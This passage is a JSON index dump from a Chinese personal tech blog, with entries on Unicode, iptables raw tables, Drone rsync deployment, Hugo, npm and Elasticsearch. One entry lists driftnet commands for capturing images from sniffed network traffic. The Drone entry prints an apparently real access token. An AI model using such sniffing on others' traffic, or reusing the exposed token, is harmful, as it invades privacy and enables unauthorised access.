plane)\"内超过这65535范围的Unicode字符，则需要使用一些诡异的技巧来实现。由于对UTF-16两个字节顺序的理解不一致，产生了大端序和小端序的概念。\n\nUTF-8（8-bit Unicode Transformation Format）是一种针对Unicode 的可变长度字符编码,UTF-8使用一至四个字节 为每个字符编码。它可以用来表示Unicode标准中的任何字符，且其编码中的第一个字节 仍与ASCII 兼容。\n \n\nCode Page\n\n在非Unicode环境下，由于不同国家和地区采用的字符集不一致，很可能出现无法正常显示所有字符的情况。微软公司使用了代码页（Codepage）转换表的技术来过渡性的部分解决这一问题，即通过指定的转换表将非Unicode的字符编码转换为同一字符对应的系统内部使用的Unicode编码。可以在“语言与区域设置”中选择一个代码页作为非Unicode编码所采用的默认编码方式，如936为简体中文GB码，950为繁体中文Big5（皆指PC上使用的）。在这种情况下，一些非英语的欧洲语言编写的软件和文档很可能出现乱码。而将代码页设置为相应语言中文处理又会出现问题，这一情况无法避免。只有完全采用统一编码才能彻底解决这些问题，但目前尚无法做到这一点。\n\n代码页技术现在广泛为各种平台所采用。UTF-7的代码页是65000，UTF-8的代码页是65001。\n\nXML和Unicode\nXML及其子集XHTML采用UTF-8作为标准字集，理论上我们可以在各种支持XML标准的浏览器上显示任何地区文字的网页，只要电脑本身安装有合适的字体即可。可以利用\u0026#nnn;的格式显示特定的字符。nnn代表该字符的十进制Unicode代码。如果采用十六进制代码，在编码之前加上x字符即可。但部分旧版本的浏览器可能无法识别十六进制代码。\n\n BOM\n iso-8859-1\n  \nhttp://www.cnblogs.com/winter-cn/archive/2012/01/27/2328512.html","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iptablesRAW表","title":"Linux命令 iptables","text":"什么是raw表？做什么用的？\n\niptables有5个链:PREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING,4个表:filter,nat,mangle,raw.\n4个表的优先级由高到低的顺序为:raw--\u0026gt;mangle--\u0026gt;nat--\u0026gt;filter\n举例来说:如果PRROUTING链上,即有mangle表,也有nat表,那么先由mangle处理,然后由nat表处理\nRAW表只使用在PREROUTING链和OUTPUT链上,因为优先级最高，从而可以对收到的数据包在连接跟踪前进行处理。一但用户使用了RAW表,在某个链上,RAW表处理完后,将跳过NAT表和 ipconntrack处理,即不再做地址转换和数据包的链接跟踪处理了.\nRAW表可以应用在那些不需要做nat的情况下，以提高性能。如大量访问的web服务器，可以让80端口不再让iptables做数据包的链接跟踪处理，以提高用户的访问速度。\nspan style=\"font-family: Arial; line-height: 26px; text-align: left; background-color: rgb(255, 255, 255); font-size: 16px; color: rgb(153, 0, 0); \"2)  iptables的数据包的流程是怎样的？\n(流程介绍来源：http://selboo.com.cn/post/721/)\n一个数据包到达时,是怎么依次穿过各个链和表的（图）。 \n\n基本步骤如下： \n数据包到达网络接口，比如 eth0。 \n进入 raw 表的 PREROUTING 链，这个链的作用是赶在连接跟踪之前处理数据包。 \n如果进行了连接跟踪，在此处理。 \n进入 mangle 表的 PREROUTING 链，在此可以修改数据包，比如 TOS 等。 \n进入 nat 表的 PREROUTING 链，可以在此做DNAT，但不要做过滤。 \n决定路由，看是交给本地主机还是转发给其它主机。 \n到了这里我们就得分两种不同的情况进行讨论了，一种情况就是数据包要转发给其它主机，这时候它会依次经过： \n进入 mangle 表的 FORWARD 链，这里也比较特殊，这是在第一次路由决定之后，在进行最后的路由决定之前，我们仍然可以对数据包进行某些修改。 \n进入 filter 表的 FORWARD 链，在这里我们可以对所有转发的数据包进行过滤。需要注意的是：经过这里的数据包是转发的，方向是双向的。 \n进入 mangle 表的 POSTROUTING 链，到这里已经做完了所有的路由决定，但数据包仍然在本地主机，我们还可以进行某些修改。 \n10. 进入 nat 表的 POSTROUTING 链，在这里一般都是用来做 SNAT ，不要在这里进行过滤。 \n11. 进入出去的网络接口。完毕。 \n另一种情况是，数据包就是发给本地主机的，那么它会依次穿过： \n进入 mangle 表的 INPUT 链，这里是在路由之后，交由本地主机之前，我们也可以进行一些相应的修改。 \n进入 filter 表的 INPUT 链，在这里我们可以对流入的所有数据包进行过滤，无论它来自哪个网络接口。 \n交给本地主机的应用程序进行处理。 \n10. 处理完毕后进行路由决定，看该往那里发出。 \n11. 进入 raw 表的 OUTPUT 链，这里是在连接跟踪处理本地的数据包之前。 \n12. 连接跟踪对本地的数据包进行处理。 \n13. 进入 mangle 表的 OUTPUT 链，在这里我们可以修改数据包，但不要做过滤。 \n14. 进入 nat 表的 OUTPUT 链，可以对防火墙自己发出的数据做 NAT 。 \n15. 再次进行路由决定。 \n16. 进入 filter 表的 OUTPUT 链，可以对本地出去的数据包进行过滤。 \n17. 进入 mangle 表的 POSTROUTING 链，同上一种情况的第9步。注意，这里不光对经过防火墙的数据包进行处理，还对防火墙自己产生的数据包进行处理。\n18. 进入 nat 表的 POSTROUTING 链，同上一种情况的第10步。 \n19. 进入出去的网络接口。完毕。\nspan style=\"font-family: Arial; line-height: 26px; text-align: left; background-color: rgb(255, 255, 255); font-size: 16px; color: rgb(153, 0, 0); \"3)  iptables raw表的使用\n增加raw表，在其他表处理之前，-j NOTRACK跳过其它表处理\n状态除了以前的四个还增加了一个UNTRACKED\n例如：\n可以使用 “NOTRACK” target 允许规则指定80端口的包不进入链接跟踪/NAT子系统\niptables -t raw -A PREROUTING -d 1.2.3.4 -p tcp --dport 80 -j NOTRACK\niptables -t raw -A PREROUTING -s 1.2.3.4 -p tcp --sport 80 -j NOTRACK\niptables -A FORWARD -m state --state UNTRACKED -j ACCEPT\nspan style=\"font-family: Arial; line-height: 26px; text-align: left; background-color: rgb(255, 255, 255); font-size: 16px; color: rgb(153, 0, 0); \"4) 解决ipconntrack: table full, dropping packetspan style=\"font-family: Arial; line-height: 26px; text-align: left; background-color: rgb(255, 255, 255); font-size: 16px; color: rgb(153, 0, 0); \"的问题\n\n在启用了iptables web服务器上，流量高的时候经常会出现下面的错误：\nipconntrack: table full, dropping packet\n这个问题的原因是由于web服务器收到了大量的连接，在启用了iptables的情况下，iptables会把所有的连接都做链接跟踪处理，这样iptables就会有一个链接跟踪表，当这个表满的时候，就会出现上面的错误。\niptables的链接跟踪表最大容量为/proc/sys/net/ipv4/ipconntrackmax，链接碰到各种状态的超时后就会从表中删除。\n所以解決方法一般有两个：\n(1) 加大 ipconntrackmax 值\nvi /etc/sysctl.conf\nnet.ipv4.ipconntrackmax = 393216\nnet.ipv4.netfilter.ipconntrackmax = 393216\n(2): 降低 ipconntrack timeout时间\nvi /etc/sysctl.conf\nnet.ipv4.netfilter.ipconntracktcptimeoutestablished = 300\nnet.ipv4.netfilter.ipconntracktcptimeouttimewait = 120\nnet.ipv4.netfilter.ipconntracktcptimeoutclosewait = 60\nnet.ipv4.netfilter.ipconntracktcptimeoutfinwait = 120\n上面两种方法打个比喻就是烧水水开的时候，换一个大锅。一般情况下都可以解决问题，但是在极端情况下，还是不够用，怎么办？\n这样就得反其道而行，用釜底抽薪的办法。iptables的raw表是不做数据包的链接跟踪处理的，我们就把那些连接量非常大的链接加入到iptables raw表。\n如一台web服务器可以这样：\niptables -t raw -A PREROUTING -d 1.2.3.4 -p tcp --dport 80 -j NOTRACK\niptables -A FORWARD -m state --state UNTRACKED -j ACCEPT\nspan style=\"font-family: Arial; line-height: 26px; text-align: left; background-color: rgb(255, 255, 255); font-size: 16px; color: rgb(153, 0, 0); \"5)  iptables raw表的效果测试\n我们在一台web server上做测试，先不使用raw表，观察链接跟踪表(/proc/net/ipconntrack)的大小：\n先看下iptables配置：\ncat /etc/sysconfig/iptables\n\\# Generated by iptables-save v1.3.5 on Wed Aug 18 10:10:52 2010\n\\filter\n:INPUT ACCEPT\n:FORWARD ACCEPT\n:OUTPUT ACCEPT [104076:12500201]\n:RH-Firewall-1-INPUT -\n-A INPUT -j RH-Firewall-1-INPUT\n-A FORWARD -j RH-Firewall-1-INPUT\n-A RH-Firewall-1-INPUT -i lo -j ACCEPT\n-A RH-Firewall-1-INPUT -p icmp -m icmp --icmp-type any -j ACCEPT\n-A RH-Firewall-1-INPUT -p esp -j ACCEPT\n-A RH-Firewall-1-INPUT -p ah -j ACCEPT\n-A RH-Firewall-1-INPUT -d 224.0.0.251 -p udp -m udp --dport 5353 -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\n-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited\nCOMMIT\n\\# Completed on Wed Aug 18 10:10:52 2010\n在另一台机器上用ab测试：\nab -c 1000 -n 5000 http://192.168.20.26/index.html\n在web server上查看链接跟踪表(/proc/net/ipconntrack)的大小：\n[root@mongo html]\\# wc -l /proc/net/ipconntrack\n5153 /proc/net/ipconntrack\n可以看到跟踪表内有5153个链接，再大一些的压力可能就要报ipconntrack: table full, dropping packet的错误了。\n下面我们启用raw表：\n先更新iptables：\n[root@mongo html]\\# cat /etc/sysconfig/iptables\n\\# Generated by iptables-save v1.3.5 on Wed Aug 18 10:10:52 2010\n\\filter\n:INPUT ACCEPT\n:FORWARD ACCEPT\n:OUTPUT ACCEPT [104076:12500201]\n:RH-Firewall-1-INPUT -\n-A INPUT -j RH-Firewall-1-INPUT \n-A FORWARD -j RH-Firewall-1-INPUT \n-A RH-Firewall-1-INPUT -i lo -j ACCEPT \n-A RH-Firewall-1-INPUT -p icmp -m icmp --icmp-type any -j ACCEPT \n-A RH-Firewall-1-INPUT -p esp -j ACCEPT \n-A RH-Firewall-1-INPUT -p ah -j ACCEPT \n-A RH-Firewall-1-INPUT -d 224.0.0.251 -p udp -m udp --dport 5353 -j ACCEPT \n-A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT \n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT \n-A RH-Firewall-1-INPUT -m state --state RELATED,ESTABLISHED,UNTRACKED -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT \n-A RH-Firewall-1-INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT \n-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited \nCOMMIT\n\\# Completed on Wed Aug 18 10:10:52 2010\n\\# Generated by iptables-save v1.3.5 on Wed Aug 18 10:10:52 2010\n\\*raw\n:PREROUTING ACCEPT [116163:9327716]\n:OUTPUT ACCEPT [104076:12500201]\n-A PREROUTING -p tcp -m tcp --dport 80 -j NOTRACK \n-A OUTPUT -p tcp -m tcp --sport 80 -j NOTRACK \nCOMMIT\n\\# Completed on Wed Aug 18 10:10:52 2010\n红色部分是新增的。\n重启iptables：\nservice iptables restart\n可以用iptables命令查看是否启用成功了：\n[root@mongo html]\\# iptables -t raw -L -n\nChain PREROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nNOTRACK    tcp  --  0.0.0.0/0            0.0.0.0/0           tcp dpt:80 \nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nNOTRACK    tcp  --  0.0.0.0/0            0.0.0.0/0           tcp spt:80 \n然后再用ab测试：\nab -c 1000 -n 5000 http://192.168.20.26/index.html\n查看链接跟踪表(/proc/net/ipconntrack)的大小：\n[root@mongo html]\\# wc -l /proc/net/ipconntrack\n1 /proc/net/ipconntrack\n跟踪表内只跟踪了一个链接了。\n[root@mongo html]\\# cat /proc/net/ipconntrack  \ntcp      6 431999 ESTABLISHED src=192.168.20.26 dst=192.168.20.10 sport=22 dport=50088 packets=85 bytes=10200 src=192.168.20.10 dst=192.168.20.26 sport=50088 dport=22 packets=92 bytes=6832 [ASSURED] mark=0 secmark=0 use=1\n可以看到iptables已经不跟踪进出端口为80的链接了。测试结果表明用iptables的raw表可以完美解决ipconntrack: table full, dropping packet的问题。","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 Intent机制","title":"Android Intent 详解","text":"---\n第十章：Intent详解\nandroid intent和intent action大全\nAndroid Activity和Intent机制学习笔记","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/os_signal","title":"golang中os/signal包的使用","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker Volume","title":"Linux命令 Docker volume","text":"Use Docker Engine plugins - Docker\nList of Docker Volume Drivers | Emerging Technology Deep Dive\nVolume Driver\n\nSupported Remote Storage Type\n\nSource\n\nFlocker\n\nOpenZFS, EMC Scaleio, NetApp ONTP, etc\n\nClusterHQ\n\nCeph RBD\n\nCeph RBD\n\nYahoo\n\nAcalephStorage\n\nVolPlugin\n\nEMC Rexray\n\nEMC Scaleio, XtremIO, AWS EBS, OpenStack Cinder\n\nEMC\n\nConvoy\n\nVFS, NFS\n\nRancher Lab\n\nGlusterfs\n\nGlusterfs\n\nDocker\n\nNFS\n\nNFS\n\nDocker\n\nAzure File Service\n\nAzure File Service\n\nMicrosoft\n\niSCSI\n\niSCSI\n\nPhoenix-io, Blockbridge\n\nFUSE derivatives\n\nsshfs\n\nkeywhiz-fs\n\nMany","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29 Meteor","title":"Meteor","text":"---\nMeteor 中文社区\nMeteor 中文文档\nIron.Router 指南\nDiscover Meteor 中文版\n\nMeteor开发指南\nMeteor-DDP","tags":null},{"location":"//blog.pytool.com/about","title":"关于我","text":"p class=\"message\"\r\n大家好，我叫 李守磊 , 现居临沂。\r\n/p\r\n\r\n\r\n我的经历\r\n\r\n [x] 2010-2014 嵌入式开发  \r\n [x] 2014-至今 devops\r\n\r\n 我的技能\r\n\r\n 编程语言：C , Python, Golang 最喜欢捣鼓 Go……\r\n 技术：略懂前端，喜欢折腾，通常使用 Golang\r\n 熟悉 嵌入式软硬件开发\r\n 服务端开发有一定的经验。\r\n 懂一点前端技术。\r\n 坚持原则，能自动化的就别手动完成\r\n\r\n生活中的我\r\n\r\n 以前玩的游戏：真三,LOL\r\n 乒乓球。\r\n 喜欢看国漫。\r\n 喜欢思考，对未知世界保持好奇心。\r\n 有点宅。\r\n\r\n\r\n 声明\r\n\r\n转载请注明原文链接，并最好与本人联系。谢谢！","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持Rsync","title":"drone支持Rsync","text":"Drone plugin for deploying code using rsync\n\nUse the Rsync plugin to synchronize files to remote hosts, and execute arbitrary commands on those hosts.\n\nConfig\nThe following parameters are used to configure the plugin:\nuser - user to log in as on the remote machines, defaults to root PLUGINUSER RSYNCUSER\nkey - private SSH key for the remote machines\nhosts - hostnames or ip-addresses of the remote machines\nport - port to connect to on the remote machines, defaults to 22\nsource - source folder to synchronize from, defaults to ./\ntarget - target folder on remote machines to synchronize to\ninclude - rsync include filter\nexclude - rsync exclude filter\nrecursive - recursively synchronize, defaults to false\ndelete - delete target folder contents, defaults to false\nscript - list of commands to execute on remote machines\n\nIt is highly recommended to put your key into a secret so it is not exposed to users. This can be done using the drone-cli.\n\ndrone secret add octocat/hello-world RSYNCKEY @path/to/.ssh/idrsa\n\nAdd the secret to your .drone.yml:\npipeline:\n  rsync:\n    image: drillster/drone-rsync\n    user: some-user\n    key: ${PLUGINKEY}\n    hosts:\n      remote1\n    source: ./dist\n    target: ~/packages\n\nSee the Secret Guide for additional information on secrets.\n\n Examples\npipeline:\n  rsync:\n    image: drillster/drone-rsync\n    user: some-user\n    key: ${RSYNCKEY}\n    hosts:\n      remote1\n      remote2\n    source: ./dist\n    target: ~/packages\n    include:\n      \"app.tar.gz\"\n      \"app.tar.gz.md5\"\n    exclude:\n      \"*.\"\n    script:\n      cd ~/packages\n      md5sum -c app.tar.gz.md5\n      tar -xf app.tar.gz -C ~/app\n\nThe example above illustrates a situation where an app package (app.tar.gz) will be deployed to 2 remote hosts (remote1 and remote2). An md5 checksum will be deployed as well. After deploying, the md5 checksum is used to check the deployed package. If successful the package is extracted.\n\nImportant\nThe script passed to script will be executed on remote machines directly after rsync completes to deploy the files. It will be executed step by step until a command returns a non-zero exit-code. If this happens, the entire plugin will exit and fail the build.\n\n drone0.5\n\nSecrets\n\nSensitive plugin attributes can be replaced with the below secret environment variables. Please see the Drone documentation to learn more about secrets.\n\nRSYNCUSER\n    corresponds to user\nRSYNCKEY\n    corresponds to key\n\nhosts    list of hosts (remote machines)\nport    port to connect to on the remote machines, defaults to 22\nuser    user to log in as on the remote machines, defaults to root\nkey    private SSH key for the remote machines\nsource    source folder to copy from, defaults to ./\ntarget    target folder on remote machines to copy to\ninclude    rsync include filter\nexclude    rsync exclude filter\nrecursive    instruct plugin to recursively copy, can be true or false, defaults to false\ndelete    instruct plugin to delete the target folder before copying, can be true or false, defaults to false\nscript    list of commands to execute on remote machines over SSH\n\npipeline:\n  build:\n    image: maven:alpine\n    commands:\n      mvn -B clean package\n      md5sum target/app.jar   app.jar.md5\n  deploy:\n    image: drillster/drone-rsync\n    hosts: [ \"server-prod1\", \"server-prod2\" ]\n    source: ./target\n    target: ~/packages\n    include: [ \"app.jar\", \"app.jar.md5\" ]\n    exclude: [ \"*.\" ]\n    script:\n      cd ~/packages\n      md5sum -c app.jar.md5\n\nexport DRONESERVER=http://kbook.org\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoicmluZXRkIiwidHlwZSI6InVzZXIifQ.0ZFhdVjrBHert1yuWBk3QFO9sKVm4iPzjTkr1l024c8\ndrone secret add --image=drillster/drone-rsync rinetd/drone-with-go RSYNCKEY @/home/ubuntu/.ssh/idrsa\ndrone sign rinetd/drone-with-go\n\n$ drone secret ls rinetd/drone-with-go          #查看\n$ drone secret rm rinetd/drone-with-go SSH_KEY  #移除","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-15-the-third-day-talk-about-clearfix-part-one","title":"第三天，谈谈【清除浮动 (上)】","text":"---\n\n初学CSS的时候，都会遇到下面这种情况:\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/z5a34/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n我们期望的结果是container包裹住它的内容。但是结果container表现的如同浮动内容不存在一样。\n\n原因得从CSS定位说起：\n\n  CSS中有3种基本的定位机制：普通流、浮动和绝对定位。除非专门指定，否则所有的框都在普通流中定位。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx设置首页跳转","title":"Linux命令 Nginx反向代理 Google","text":"html\nmeta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com/\"\n/html\n\nlocation /wmb {\n if ( $requesturi = \"/wmb/\" ) {\n      rewrite \"/wmb/\" /wmb/weibo.html break;\n  }\n  proxyredirect off;\n  proxysetheader Host $httphost;\n  proxysetheader X-Real-IP $remoteaddr;\n  proxysetheader X-Forwarded-For $proxyaddxforwardedfor;\n  proxy_pass http://10.29.164.2:9008;\n}","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 图片嗅探 driftnet","title":"driftnet","text":"语法： driftnet   [options]   [filter code]\n\n主要参数：\n\n -b               捕获到新的图片时发出嘟嘟声\n\n-i  interface     选择监听接口\n\n-f  file   读取一个指定pcap数据包中的图片\n\n-p  不让所监听的接口使用混杂模式\n\n-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）\n\n-m number 指定保存图片数的数目\n\n-d directory  指定保存图片的路径\n\n-x prefix  指定保存图片的前缀名\n\n使用举例：\n\n1.实时监听： driftnet -i wlan0\n\n2.读取一个指定pcap数据包中的图片： driftnet -f /home/linger/backup/ap.pcapng -a -d /root/drifnet/\n\n自动保存图片\n sudo driftnet -i enp3s0 -d ~/drifnet/ -a","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 android常见问题","title":"","text":"","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 node","title":"工具软件 npm","text":"---\nnvm\nlinux\nwindows\n\n npm配置镜像、设置代理\nregistry = http://registry.npmjs.org/      #官方npm镜像\nregistry = http://registry.npm.taobao.org/ #淘宝npm镜像\nregistry=http://npmreg.mirrors.ustc.edu.cn/\n\n1.临时使用\nnpm --registry https://registry.npm.taobao.org install express\n\n2.持久使用\nnpm config set registry https://registry.npm.taobao.org\n\n// 配置后可通过下面方式来验证是否成功\nnpm config get registry\nnpm info express\n\n3.编辑 ~/.npmrc 加入下面内容 和2等价\nregistry = https://registry.npm.taobao.org\n\n4.通过cnpm使用\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\n\n5.设置代理\nnpm config set proxy http://server:port\nnpm config set https-proxy http://server:port\n如果需要认证的话可以这样设置：\nnpm config set proxy http://username:password@server:port\nnpm confit set https-proxy http://username:password@server:port\n如果代理不支持https的话需要修改npm存放package的网站地址。\n\n升级npm\nnpm install -g npm\n\n使用nrm快速切换npm源\nnrm 是一个 NPM 源管理器，允许你快速地在如下 NPM 源间切换：\n\n列表项目\nnpm\ncnpm\nstrongloop\nenropean\naustralia\nnodejitsu\ntaobao\nInstall\nsudo npm install -g nrm\n如何使用？\n列出可用的源：\n\n  ➜  ~  nrm ls\n  npm","tags":null},{"location":"//blog.pytool.com/Edit/vim best Tips","title":"vim 最佳实践","text":"---\nvimtips.txt*\tFor Vim version 8.0.","tags":null},{"location":"//blog.pytool.com/hugo/hugo","title":"个人博客hugo","text":"---\n中文帮助\n主题 hueman https://demo-hueman.presscustomizr.com/demo/layouts/boxed/#\n如果需要更新所有Hugo的依赖库，增加 -u 参数：\n$ go get -u -v github.com/spf13/hugo\n\n快速生成站点\nhugo new site /path/to/site\n\n创建一个 about 页面：\n$ hugo new about.md\n\nhugo new post/first.md\n创建 themes 目录\n$ cd themes\n$ git clone https://github.com/spf13/hyde.git\n\ngithub.com/laozhu/hugo-nuo\n\n主题:\n瀑布流风格 Zenithar/hugo-theme-bleak\n卡片风格 ageekymonk/hugo-tracks-theme \nGoogle 图片风格 aerohub/hugrid \n\n博客 Vimux/Mainroad \n简洁黑 yoshiharuyamashita/blackburn\n网站风格 mmrath/hugo-bootstrap  http://mmrath.com/\n博客 nodejh/hugo-theme-cactus-plus: \n博客 dim0627/hugothemerobust \n\nappernetic/hugo-bootstrap-premium \n官网 digitalcraftsman/hugo-creative-theme \n官网 saey55/hugo-elate-theme\n\nBeautiful static documentation for your API \n神器DOCAPI bep/docuapi\n\nWIKI ArchLinux syui/hugo-theme-arch \n\n文档风格 Bootie Docs\n文档风格 docDock\n文档风格 key-amb/hugo-theme-bootie-docs:\n文档风格 Swiftline\n文档风格 Grav matcornic/hugo-theme-learn \n文档风格 drone \n\n个人简历 aerohub/hugo-orbit-theme \n\n全文搜索 lunr\ngo get github.com/arial7/hugo-golunr\n名词解释\nTaxonomy 是用来展示内容之间逻辑关系的一种分类方法\n\nfront-matter\n必填的\ntitle：\"文章的标题\"\ndescription：内容的描述\ndate：时间，一般的这个时间由hugo自己填写\ntaxonomies：分类术语的复数形式\n\n选填的\n\naliases：一个或者多个别名（数组），别名用于生成html路径。\ndraft: 草稿。如果设置为“f true”， 内容将不会发布，除非使用“–buildDrafts”参数。\n\n 新入门的经常看不到内容，都是这个“draft”的原因，建议直接删除。\n\npublishdate ：发布日期\ntype ：内容的类型\nisCJKLanguage ：汉字编码（其实还包括日文韩语）。如果设置了，才能正确的使用汉字的自动摘要”.Summary “和字数统计” .WordCount”。\nweight ：权重，用于排序的一个数字。默认是从小到大的，可以是负数。\nmarkup ：标记 (试验性的)。默认是md，也可以是”rst“格式。rst是”reStructuredText“格式。\nslug ：小节。在url尾巴处出现的一个”token“。\nurl ：从根目录开始的全部url。\n\nsection\n\n章节是目录名字，也就是content下面的 目录\n type\n默认的，一个章节就是一种内容类型。那么只需要建立 xxx 目录（章节），就设置了 xxx 内容类型。\n当然，通过文件头指定type属性，就是设置内容类型。我们指定文章内容的“ type = “ xxx ”就设置 xxx 内容类型。\n\n模板\nhugo的基本模板分为三种：详细页，列表页，首页。\n\n详细页名称为single.html，用于对应单独一篇文章的输出。\n\n列表页名称为list.html，用于一个栏目、类型、章节、日期等等归集的列表输出。列表页可以分页。\n\n首页名称为index.html，用于导航列表页和详细页。单页面站点可以只有首页。\n 模板匹配规则\n\n  若有与文件类型（章节）相同文件名 的内容模板，则匹配和使用。\n  若没有，则匹配“ default.md ”。\n  若使用 主题 文件，则使用主题的“archetypes”，规则与全局的相同。\n  若都没有匹配的，则使用hugo自带的。\n渲染规则\n      若hugo无themes文件夹，或themes下面没有主题，则使用根目录下的layouts、archetypes和static文件进行渲染。\n      若有主题文件并设置了主题，则使用主题文件渲染。\n      首页使用index.html渲染。\n      列表页使用default下的list.html渲染。\n      详细页（对应单个的md文件）使用default下的single.html渲染。\n      若设置了内容类型，则使用相应的“xxx”类型文件目录下的list和single.html渲染。\n      单页面站点需要index.html,首页index.html模板支持所有列表页和详细页的模板参数、函数。\n\n      列表就是很多个的文章，单个就是单篇，hugo还有模板文件分割（比如头部共同文件）、视图、片段等概念，非常灵活方便，其实hugo的模板就是go模板，无奈谷歌被墙。好东西总是忍不住一枝红杏出墙来！\n hugo单页模板匹配\n\n以下是hugo的单页面模板匹配过程：\n\n  /layouts/类型 或 章节/LAYOUT.html\n  /layouts/类型 或 章节/single.html\n  /layouts/default/single.html\n  /themes/主题/layouts/类型 或 章节/LAYOUT.html\n  /themes/主题/layouts/类型 或 章节/single.html\n  /themes/主题/layouts/default/single.html\n\n  以上中文部分都是我们后面新建的主题、类型、章节。我们推荐使用主题，也就是后三个规则。\n\n  为了方便，我们直接修改默认新建主题生成的“/themes/hugaotheme/layouts/default/ single.html ”单页面主题。\n\n变量\n{{- .Title -}} 移除前后空白字符 [ \\t \\r \\n ]\n config.yaml 站点级变量访问\n.Site.Social #Site变量首字母必须大写\n.Site.Params.Links\n[params.Links] 多级配置变量\n  youdao = \"www.youdao.com\"\n  baidu = \"www.youdao.com\"\npage级变量访问\n.Params.tags   front matter变量\n.RelPermalink    the relative permanent link for this page.\n.RelRef\n    returns the relative permalink for a given reference (e.g., RelRef \"sample.md\"). .RelRef does not handle in-page fragments correctly. See Cross References.\n.Section    当前文档所属的一级目录\n.Title\n.Truncated    “Read more…”\n.Type       the content type of the content (e.g., post).\n.URL\n全局变量访问 Use $. to Access the Global Context\n    $.Site.Title\n .File 变量 等价 .Source.File  \n\n访问目录结构\n{{range .Site.Sections }}\n{{  .Type | Title }}                 .Type关键 获取Section名称\n{{end}}\n如何访问所有的categories\n{{range $k,$v := .Site.Taxonomies.categories}}\n    option value=\"{{$k | humanize | lower}}\"{{$k | humanize | lower}}/option\n{{end}}\n{{ with .Site.Taxonomies.categories }}\n\n\t  h1 class=\"headline\"Categories/h1\n\n\t  section class=\"categories\"\n\t    {{ range $name, $value := . }}\n\t    h2 class=\"category\"\n\t      a href=\"{{ $baseurl }}categories/{{ $name | urlize }}\"{{ title $name }}/a\n\t      small({{ .Count }})/small\n\t    /h2\n\t    {{ end }}\n\t  /section\n\n\t{{ end }}\n\n\t{{ with .Site.Taxonomies.tags }}\n\n\t  h1 class=\"headline\"Tags/h1\n\t\t  section class=\"tags\"\n\t    {{ range $name, $value := . }}\n\t    span class=\"tag\"\n\t      a href=\"{{ $baseurl }}tags/{{ $name | urlize }}\"{{ $name }}/a\n\t      small({{ .Count }})/small\n\t    /span\n\t    {{ end }}\n\t  /section\n\t{{ end }}\n\n--uglyURLs  增加.html后缀\n└── content\n    └── about\n    |   └── _index.md  // \u003c- https://example.com/about/index.html\n    ├── post\n    |   ├── firstpost.md   // \u003c- https://example.com/post/firstpost.html\nsection path slug url\n                    section\n                    ⊢--^--⊣\n                          path        slug\n                    ⊢","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch]数据搜索(入门级干货)","title":"Elasticsearch 数据搜索篇·【入门级干货】","text":"Elasticsearch 数据搜索篇·【入门级干货】\n\n   ES即简单又复杂，你可以快速的实现全文检索，又需要了解复杂的REST API。本篇就通过一些简单的搜索命令，帮助你理解ES的相关应用。虽然不能让你理解ES的原理设计，但是可以帮助你理解ES，探寻更多的特性。\n\n   其他相关的内容参考：Elasticsearch官方文档翻译\n\n样例数据\n\n为了更好的使用和理解ES，没有点样例数据还是不好模拟的。这里提供了一份官网上的数据，accounts.json。如果需要的话，也可以去这个网址玩玩，它可以帮助你自定义写随机的JSON数据。\n\n首先开启你的ES，然后执行下面的命令，windows下需要自己安装curl、也可以使用cygwin模拟curl命令:\n\ncurl -XPOST 'localhost:9200/bank/account/bulk?pretty' --data-binary  @accounts.json\n\n注意：\n\n1 需要在accounts.json所在的目录运行curl命令。\n\n2 localhost:9200是ES得访问地址和端口\n\n3 bank是索引的名称\n\n4 account是类型的名称\n\n5 索引和类型的名称在文件中如果有定义，可以省略；如果没有则必须要指定\n\n6 bulk是rest得命令，可以批量执行多个操作（操作是在json文件中定义的，原理可以参考之前的翻译）\n\n7 pretty是将返回的信息以可读的JSON形式返回。\n\n执行完上述的命令后，可以通过下面的命令查询：\n\ncurl 'localhost:9200/cat/indices?v'\nhealth index pri rep docs.count docs.deleted store.size pri.store.size\nyellow bank    5   1       1000            0    424.4kb        424.4kb\n\n搜索API\n\nES提供了两种搜索的方式：请求参数方式 和 请求体方式。\n\n请求参数方式\n\ncurl 